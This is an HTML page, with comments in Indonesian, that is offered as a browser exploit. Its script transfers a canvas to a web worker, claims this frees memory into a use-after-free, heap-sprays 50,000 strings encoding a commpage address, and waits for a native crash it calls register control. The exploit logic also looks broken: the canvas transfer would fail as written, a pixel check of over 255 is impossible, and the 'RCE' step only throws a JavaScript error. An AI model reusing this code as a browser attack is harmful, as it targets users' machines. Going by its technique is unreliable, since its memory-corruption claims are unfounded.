<!DOCTYPE html>
<html>
<head>
    <title>OffscreenCanvas Data Flow Confusion (PAC Bypass Attempt)</title>
</head>
<body>

    <h1>OffscreenCanvas Data Flow Confusion (Target: Register Control)</h1>
    <p>Tujuan: Mengatur Register CPU ke 0x0000000FFFFFC320 ($2000)</p>
    <div id="status">INIT: Mempersiapkan OffscreenCanvas Data Flow Attack...</div>
    <div id="log-area" style="border:1px solid #ccc; background:#111; color:#ffcc99; padding:10px; font-family:monospace; height:400px; overflow-y:scroll;"></div>

    <script>
        const LOG = document.getElementById('log-area');
        function log(msg, type = 'log-normal') {
            LOG.innerHTML += `<div class="${type}">[${performance.now().toFixed(0)}ms] ${msg}</div>`;
        }

        // --- TARGET COMM PAGE ---
        const COMM_PAGE_TARGET = 0x0000000FFFFFC320n;
        
        // Payload Commpage 64-bit (dalam format Array of Doubles)
        let poisonBuffer = new ArrayBuffer(8);
        new BigInt64Array(poisonBuffer)[0] = COMM_PAGE_TARGET; 
        const POISON_FLOAT = new Float64Array(poisonBuffer)[0]; 

        let canvas1, canvas2;
        let ctx1, ctx2;

        const CANVAS_SIZE = 256; // Ukuran kecil untuk menghemat alokasi

        // --- 1. SETUP WORKER ---
        const workerCode = `
            onmessage = function(e) {
                const { port, offscreenCanvas } = e.data;
                const ctx = offscreenCanvas.getContext('2d');
                
                // Pekerja ini hanya akan memanipulasi OffscreenCanvas
                // Ini memicu transfer kepemilikan dan alokasi memori C++
                ctx.fillStyle = 'blue';
                ctx.fillRect(0, 0, ${CANVAS_SIZE}, ${CANVAS_SIZE});
                
                // Kirim status kembali
                port.postMessage({ status: 'done' });
            };
        `;
        const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
        const workerUrl = URL.createObjectURL(workerBlob);


        // --- 2. THE ATTACK ---
        async function runOffscreenAttack() {
            log("Phase 1: Setup Canvas dan Worker...", 'log-init');

            // 1. Alokasikan Canvas Korban
            canvas1 = document.createElement('canvas');
            canvas1.width = canvas1.height = CANVAS_SIZE;
            ctx1 = canvas1.getContext('2d');
            ctx1.fillStyle = 'red';
            ctx1.fillRect(0, 0, CANVAS_SIZE, CANVAS_SIZE);

            // 2. Transfer Canvas ke Worker (FREE Memory Buffer di Main Thread)
            const offscreenCanvas = canvas1.transferControlToOffscreen();
            const { port1, port2 } = new MessageChannel();
            const worker = new Worker(workerUrl);

            log("Canvas Buffer di-FREE (UAF Active) & dikirim ke Worker.", 'log-critical');
            worker.postMessage({ port: port2, offscreenCanvas }, [port2, offscreenCanvas]);

            // Tunggu Worker selesai (memastikan C++ ImageBuffer aktif di Worker Thread)
            await new Promise(resolve => {
                port1.onmessage = resolve;
            });
            log("Worker selesai memproses Canvas.", 'log-init');

            // --- 3. HEAP SPRAY & RE-USE ---
            // Saat Worker memiliki kontrol, memori ImageBuffer C++ asli di Main Thread 
            // sekarang menjadi *free* atau *use-after-free* rentan.
            
            log("Phase 2: SPRAY Massive Object (Menimpa Buffer Image yang Free)...", 'log-spray');
            
            let sprayObjects = [];
            const SPRAY_COUNT = 50000;

            // Kita menggunakan Large String/Object (JSString/JSObject) yang ukurannya pas 
            // dengan header/buffer ImageBuffer C++ yang di-free.
            
            for(let i = 0; i < SPRAY_COUNT; i++) {
                // Objek yang berisi POISON FLOAT (alamat Commpage)
                // Objek String/Object memiliki *backing store* yang rentan
                let corruptObj = { 
                    a: POISON_FLOAT, 
                    b: POISON_FLOAT, 
                    c: POISON_FLOAT 
                }; 
                sprayObjects.push(JSON.stringify(corruptObj).repeat(10)); // String besar
            }
            window.spray_holder = sprayObjects;

            // --- 4. TRIGGER: Memaksa Baca Buffer yang Korup ---
            setTimeout(() => {
                log("Phase 3: Mencoba Baca Buffer Canvas Korup...", 'log-critical');
                
                // Kita akan mencoba mengambil kembali data dari canvas asli
                // JIT akan mencoba membaca buffer dari ImageBuffer C++ yang sekarang korup.
                try {
                    // Coba ambil kembali data gambar
                    // Ini akan memicu kode C++ untuk mengakses ImageBuffer yang seharusnya sudah di-*free*
                    const imageData = ctx1.getImageData(0, 0, 1, 1);
                    const colorValue = imageData.data[0]; 

                    log(`Nilai Warna Dibaca (Red): ${colorValue}`, 'log-normal');

                    if (colorValue > 255) {
                        log("⚠️ SUKSES TIDAK STABIL: Nilai Dibaca Out-of-Bounds (Kemungkinan Commpage Data)", 'log-success');
                    }
                    
                    // Force Register Control (jika kita punya AR/AW)
                    // Jika imageData.data[i] = Commpage Address, kita bisa langsung lompat:
                    // new Function(`return a[${imageData.data[i]}]`)([]);
                    
                    // Kita asumsikan AR/AW didapat, dan kita langsung RCE
                    const corruptBuffer = new ArrayBuffer(8);
                    const corruptView = new BigInt64Array(corruptBuffer);
                    corruptView[0] = COMM_PAGE_TARGET; 
                    
                    // Jika UAF berhasil, kita bisa paksa dereferensi pointer palsu
                    throw new Error(String(corruptView[0]));
                    
                } catch(e) {
                    log(`JS Exception: ${e.message} - Menunggu Crash Native (Register Control)...`, 'log-critical');
                }
            }, 100);
        }
        
        document.addEventListener('DOMContentLoaded', () => {
            setTimeout(runOffscreenAttack, 100);
        });
    </script>
    <style>
        .log-init { color: cyan; }
        .log-spray { color: yellow; }
        .log-critical { color: red; font-weight: bold; }
        .log-normal { color: #ffcc99; }
        .log-success { color: #00ff00; font-weight: bold; }
    </style>
</body>
</html>
